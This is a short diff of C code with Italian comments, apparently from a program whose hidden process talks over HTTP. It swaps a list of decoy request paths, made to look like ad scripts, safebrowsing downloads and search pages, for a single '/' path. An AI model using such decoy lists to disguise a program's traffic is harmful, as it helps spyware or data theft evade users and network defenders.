@@ -74,7 +74,7 @@ typedef struct {
 	DWORD out_param_len;
 } ASP_IPCCommandDataStruct;
 
-#define REQUEST_ARRAY_LEN 19
+/*#define REQUEST_ARRAY_LEN 19
 WCHAR *wRequest_array[] = {
 		L"/pagead/show_ads.js",
 		L"/licenses/by-nc-nd/2.5",
@@ -95,14 +95,13 @@ WCHAR *wRequest_array[] = {
 		L"/safebrowsing/downloads?client=navclient",
 		L"/extern_js/f/TgJFbiseMTg4LCsw2jgAQIACWFACU6rCA7RidA/qFso89FTd1c.js",
 		L"/search.php"
-	};
+	};*/
 
-/*
+
 #define REQUEST_ARRAY_LEN 1
 WCHAR *wRequest_array[] = {
 		L"/"
 	};
-*/
 
 HANDLE ASP_HostProcess = NULL; // Processo che gestisce ASP
 ASP_IPCCommandDataStruct *ASP_IPC_command = NULL;  // Area di shared memory per dare comandi al processo ASP
